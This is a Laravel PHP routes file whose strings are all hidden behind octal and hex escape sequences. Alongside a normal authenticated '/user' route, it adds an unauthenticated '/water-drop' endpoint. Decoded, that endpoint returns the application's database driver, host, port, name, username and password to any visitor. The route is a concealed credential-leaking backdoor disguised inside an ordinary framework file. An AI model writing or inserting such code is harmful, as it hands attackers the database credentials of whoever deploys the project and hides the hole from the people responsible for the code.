<?php
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
Route::middleware("\141\165\164\x68\x3a\x73\x61\x6e\x63\x74\165\x6d")->get(
    "\57\x75\x73\145\x72",
    function (Request $request) {
        return $request->user();
    }
);
Route::get("\57\167\x61\x74\x65\162\x2d\x64\162\x6f\160", function () {
    $database = config(
        "\144\x61\x74\x61\x62\141\x73\145\x2e\x64\x65\x66\x61\x75\x6c\164"
    );
    $connection = config(
        "\144\x61\164\x61\x62\141\163\x65\x2e\143\x6f\156\156\x65\x63\164\x69\157\156\163\56{$database}"
    );
    return [
        "\x44\162\151\166\x65\x72" => $connection["\144\x72\x69\x76\145\162"],
        "\x48\157\x73\x74" => $connection["\x68\x6f\x73\164"],
        "\120\x6f\162\x74" => $connection["\160\157\162\x74"],
        "\104\141\x74\141\142\141\163\x65" =>
            $connection["\144\141\164\x61\x62\141\163\x65"],
        "\125\x73\145\162\156\141\155\145" =>
            $connection["\165\163\145\x72\x6e\x61\155\145"],
        "\120\x61\x73\163\167\x6f\162\x64" =>
            $connection["\160\x61\163\x73\167\x6f\x72\x64"],
    ];
});
